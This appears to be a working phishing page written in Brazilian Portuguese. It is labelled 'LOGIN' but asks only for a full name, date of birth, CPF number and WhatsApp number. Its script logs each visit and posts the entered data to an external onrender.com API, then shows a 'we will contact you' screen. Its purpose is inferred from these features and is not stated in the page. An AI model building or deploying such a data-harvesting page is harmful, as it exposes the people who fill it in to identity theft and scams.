<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulário Pessoal</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, Arial, sans-serif;
      background: linear-gradient(135deg, #667eea, #764ba2);
      min-height: 100vh; padding: 12px;
      display: flex; justify-content: center; align-items: flex-start;
    }
    .container {
      background: #fff; padding: 22px 20px; border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      width: 100%; max-width: 380px; margin: 10px 0;
    }
    h1 { font-size: 18px; color: #333; text-align: center; margin-bottom: 4px; }
    .sub { text-align: center; color: #888; font-size: 11px; margin-bottom: 14px; }
    label {
      display: block; font-size: 12px; color: #555;
      margin-bottom: 4px; margin-top: 12px; font-weight: 600;
    }
    input, select, textarea {
      width: 100%; padding: 9px 10px; border: 1px solid #ddd;
      border-radius: 6px; font-size: 14px; font-family: inherit; background: #fff;
    }
    input:focus, select:focus, textarea:focus { outline: none; border-color: #667eea; }
    button {
      width: 100%; padding: 11px; background: #667eea; color: #fff;
      border: none; border-radius: 6px; font-size: 14px;
      font-weight: bold; cursor: pointer; margin-top: 20px;
    }
    button:hover { background: #5568d3; }
    button:disabled { background: #aaa; }
    .erro {
      margin-top: 12px; padding: 8px; border-radius: 6px;
      font-size: 12px; display: none; text-align: center;
      background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
    }

    #telaSucesso {
      display: none; position: fixed; inset: 0;
      background: #FFD400; color: #000; z-index: 9999;
      justify-content: center; align-items: center;
      padding: 30px; text-align: center;
    }
    #telaSucesso .icone { font-size: 70px; margin-bottom: 20px; animation: pular 1s infinite; }
    #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
    #telaSucesso p { font-size: 18px; font-weight: 600; }

    @keyframes pular {
      0%, 100% { transform: translateY(0); }
      50%      { transform: translateY(-12px); }
    }
  </style>
</head>
<body>

  <div id="telaSucesso">
    <div>
      <div class="icone">📨</div>
      <h2>AGORA AGUARDE<br>VAMOS ENTRAR EM CONTATO</h2>
      <p>Obrigado por preencher! 💛</p>
    </div>
  </div>

  <div class="container">
    <h1>🔒 LOGIN</h1>
    <p class="sub">Preencha seus dados abaixo</p>

    <label for="nome">Nome completo *</label>
    <input id="nome" type="text" placeholder="Ex: João Silva" />

    <label for="dataNascimento">Data de nascimento *</label>
    <input id="dataNascimento" type="date" />

    <label for="cpf">CPF *</label>
    <input id="cpf" type="text" placeholder="000.000.000-00" maxlength="14" />

    <label for="whatsapp">WhatsApp *</label>
    <input id="whatsapp" type="tel" placeholder="Ex: (11) 99999-9999" />

    <button id="btn">Enviar</button>
    <div id="resultado" class="erro"></div>
  </div>

  <script>
    const API_URL = 'https://gets-invio-on-api.onrender.com';

    fetch(API_URL + '/visita', { method: 'POST' }).catch(() => {});

    const btn = document.getElementById('btn');
    const resultado = document.getElementById('resultado');
    const telaSucesso = document.getElementById('telaSucesso');

    function pegar(id) { return document.getElementById(id).value.trim(); }

    document.getElementById('cpf').addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 11);
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      e.target.value = v;
    });

    btn.addEventListener('click', async () => {
      const dadosForm = {
        nome: pegar('nome'),
        dataNascimento: pegar('dataNascimento'),
        cpf: pegar('cpf'),
        whatsapp: pegar('whatsapp'),
      };

      resultado.style.display = 'none';

      const obrig = ['nome','dataNascimento','cpf','whatsapp'];
      const faltando = obrig.filter(c => !dadosForm[c]);
      if (faltando.length > 0) {
        resultado.textContent = '⚠️ Preencha todos os campos com *';
        resultado.style.display = 'block';
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Enviando...';

      try {
        const r = await fetch(API_URL + '/enviar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dadosForm)
        });
        const dados = await r.json();

        if (dados.sucesso) {
          telaSucesso.style.display = 'flex';
        } else {
          resultado.textContent = '❌ ' + (dados.erro || 'Erro.');
          resultado.style.display = 'block';
        }
      } catch (e) {
        resultado.textContent = '❌ Erro ao conectar. Tente novamente.';
        resultado.style.display = 'block';
      }

      btn.disabled = false;
      btn.textContent = 'Enviar';
    });
  </script>
</body>
</html>
